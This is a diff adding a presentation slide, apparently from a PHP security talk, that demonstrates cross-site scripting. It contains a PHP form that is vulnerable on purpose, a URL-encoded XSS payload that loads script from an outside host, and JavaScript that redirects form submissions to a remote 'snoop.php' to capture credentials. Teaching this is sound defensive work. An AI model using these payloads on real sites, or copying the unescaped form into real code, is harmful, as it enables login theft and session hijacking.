@@ -1,0 +1,53 @@
+<slide title="Risks">
+<break lines="1" />
+
+<blurb fontsize="4em">Ok, that is somewhat annoying, but what can actually happen?</blurb>
+
+<example title="Typical Form" fontsize="1.6em"><![CDATA[<html>
+ <head><title>My Form</title></head>
+ <body>
+<?php 
+  if($_SERVER['REQUEST_METHOD']=='POST' && 
+     $_POST['id']=='rasmus' && $_POST['pwd']=='foobar') {
+           echo "Welcome back ".$_POST['id']; 
+  } else {
+?>
+  <form action="<?php echo $_SERVER['PHP_SELF']?>" method="post">
+   <input type="text" name="id" />
+   <input type="password" name="pwd" />
+   <input type="submit" />
+  </form>
+<? } ?>
+ </body>
+</html>]]></example>
+
+<example title="Hack" fontsize="1.5em"><![CDATA[http://localhost/form.php/%22%20method=%22POST%22%3E
+%3Cscript%20src=%22http://lerdorf.com/txss%22%3E%3C/script%3E%3Cb%20a=%22]]></example>
+
+<example title="Decoded" fontsize="1.5em"><![CDATA[http://localhost/form.php/" method="POST">
+<script src="http://lerdorf.com/txss"></script><b a="]]></example>
+
+<example title="Remote Javascript" type="javascript" fontsize="1.6em"><![CDATA[function a(event) {
+  document.forms[0].action = "http://lerdorf.com/snoop.php";
+}
+function addLoadEvent(func) {
+  var oldonload = window.onload;
+  if (typeof window.onload != 'function') {
+    window.onload = func;
+  } else {
+    window.onload = function() {
+      oldonload();
+      func();
+    }
+  }
+}
+addLoadEvent(a);]]></example>
+
+<list fontsize="6em">
+<bullet> Stolen cookies</bullet>
+<bullet> Intercepted POST requests</bullet>
+<bullet> Content injection</bullet>
+<bullet> Invisible requests on behalf of user</bullet>
+</list>
+
+</slide>
